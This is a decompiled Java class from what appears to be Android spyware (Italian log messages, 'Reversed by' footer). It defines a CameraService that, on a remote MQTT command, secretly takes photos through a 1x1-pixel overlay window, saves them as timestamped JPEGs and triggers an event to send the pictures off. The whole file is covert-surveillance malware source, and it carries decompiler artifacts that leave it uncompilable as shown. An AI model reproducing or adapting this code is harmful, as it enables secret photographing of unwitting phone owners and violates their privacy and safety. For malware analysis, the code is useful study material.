package com.app.system.common;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.view.ViewGroup.LayoutParams;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import com.app.system.common.d.a.e;
import com.app.system.common.service.EventsAndReceiveService;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class CameraService
  extends Service
{
  private a a;
  private String b;
  private Error c;
  private MqttCommand d;
  private SurfaceView e;
  
  private int a(a parama)
  {
    int i = Camera.getNumberOfCameras();
    for (int j = 0; j < i; j++)
    {
      Camera.CameraInfo localCameraInfo = new Camera.CameraInfo();
      Camera.getCameraInfo(j, localCameraInfo);
      if (localCameraInfo.facing == parama.a()) {
        return j;
      }
    }
    return -1;
  }
  
  private void a()
  {
    int i = a(this.a);
    if (i != -1) {
      try
      {
        com.security.d.a.d("CameraService", "Preparazione surface view...", new Object[0]);
        Object localObject1 = new android/view/SurfaceView;
        ((SurfaceView)localObject1).<init>(this);
        this.e = ((SurfaceView)localObject1);
        Object localObject2 = this.e.getHolder();
        localObject1 = new com/app/system/common/CameraService$1;
        ((1)localObject1).<init>(this, i);
        ((SurfaceHolder)localObject2).addCallback((SurfaceHolder.Callback)localObject1);
        localObject2 = (WindowManager)getSystemService("window");
        if (Build.VERSION.SDK_INT >= 26) {
          i = 2038;
        } else {
          i = 2006;
        }
        localObject1 = new android/view/WindowManager$LayoutParams;
        ((WindowManager.LayoutParams)localObject1).<init>(1, 1, i, 0, 0);
        ((WindowManager)localObject2).addView(this.e, (ViewGroup.LayoutParams)localObject1);
        return;
      }
      catch (Exception localException)
      {
        com.security.d.a.a("CameraService", "Errore fotocamera", new Object[] { localException });
        throw new Error("Errore fotocamera", localException);
      }
    }
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("Fotocamera ");
    localStringBuilder.append(this.a);
    localStringBuilder.append(" non presente");
    throw new Error(localStringBuilder.toString());
  }
  
  private void a(final int paramInt, final String paramString)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        MqttCommandReply localMqttCommandReply = CameraService.b(CameraService.this).b(CameraService.this);
        localMqttCommandReply.result = paramInt;
        localMqttCommandReply.replyText = paramString;
        new e(CameraService.this).a(localMqttCommandReply);
      }
    }).start();
  }
  
  private void b()
  {
    if (this.b != null)
    {
      a(0, "Foto scattata con successo");
      localObject = new Intent(this, EventsAndReceiveService.class);
      ((Intent)localObject).putExtra("event_core_app", "event_send_pics");
      com.b.a.a.a.a(this, (Intent)localObject);
    }
    Object localObject = this.c;
    if (localObject != null) {
      a(317, ((Error)localObject).getMessage());
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    this.a = null;
    this.b = null;
    this.c = null;
    this.d = null;
    this.e = null;
    try
    {
      this.a = ((a)paramIntent.getExtras().get("camera"));
      this.d = ((MqttCommand)paramIntent.getExtras().get("mqtt-cmd"));
      a();
    }
    catch (Exception paramIntent)
    {
      com.security.d.a.d("CameraService", "onStartCommand", new Object[] { paramIntent });
    }
    catch (Error paramIntent)
    {
      com.security.d.a.d("CameraService", "onStartCommand", new Object[] { paramIntent });
      a(317, paramIntent.getMessage());
    }
    return 2;
  }
  
  public static class Error
    extends Exception
  {
    public Error(String paramString)
    {
      super();
    }
    
    public Error(String paramString, Throwable paramThrowable)
    {
      super(paramThrowable);
    }
    
    public String getMessage()
    {
      String str = super.getMessage();
      Throwable localThrowable = getCause();
      Object localObject = str;
      if (localThrowable != null)
      {
        localObject = new StringBuilder();
        ((StringBuilder)localObject).append(str);
        ((StringBuilder)localObject).append("\nCausa: ");
        ((StringBuilder)localObject).append(localThrowable.getMessage());
        localObject = ((StringBuilder)localObject).toString();
      }
      return (String)localObject;
    }
  }
  
  public static enum a
  {
    private int c;
    
    private a(int paramInt)
    {
      this.c = paramInt;
    }
    
    public int a()
    {
      return this.c;
    }
    
    public char b()
    {
      char c1;
      char c2;
      if (this.c == 1)
      {
        c1 = 'F';
        c2 = c1;
      }
      else
      {
        c1 = 'B';
        c2 = c1;
      }
      return c2;
    }
  }
  
  private class b
    implements Camera.PictureCallback
  {
    private b() {}
    
    private File a()
    {
      File localFile = new File(c.f, "Camera/");
      localFile.mkdirs();
      long l = new Date().getTime() / 1000L;
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append(l);
      localStringBuilder.append("_");
      localStringBuilder.append(CameraService.d(CameraService.this).b());
      localStringBuilder.append(".jpg");
      return new File(localFile, localStringBuilder.toString());
    }
    
    public void onPictureTaken(byte[] paramArrayOfByte, Camera paramCamera)
    {
      paramCamera = a();
      Object localObject = new StringBuilder();
      ((StringBuilder)localObject).append("Salvataggio file in ");
      ((StringBuilder)localObject).append(paramCamera);
      ((StringBuilder)localObject).append("...");
      com.security.d.a.d("CameraService", ((StringBuilder)localObject).toString(), new Object[0]);
      try
      {
        localObject = new java/io/FileOutputStream;
        ((FileOutputStream)localObject).<init>(paramCamera);
        ((FileOutputStream)localObject).write(paramArrayOfByte);
        ((FileOutputStream)localObject).close();
        CameraService.a(CameraService.this, paramCamera.getAbsolutePath());
        com.security.d.a.d("CameraService", "Salvataggio file completato", new Object[0]);
        ((WindowManager)CameraService.this.getSystemService("window")).removeView(CameraService.c(CameraService.this));
      }
      catch (Exception paramArrayOfByte)
      {
        CameraService.a(CameraService.this, new CameraService.Error("Errore scatto foto", paramArrayOfByte));
      }
    }
  }
}


/* Location:              ~/com/app/system/common/CameraService.class
 *
 * Reversed by:           J
 */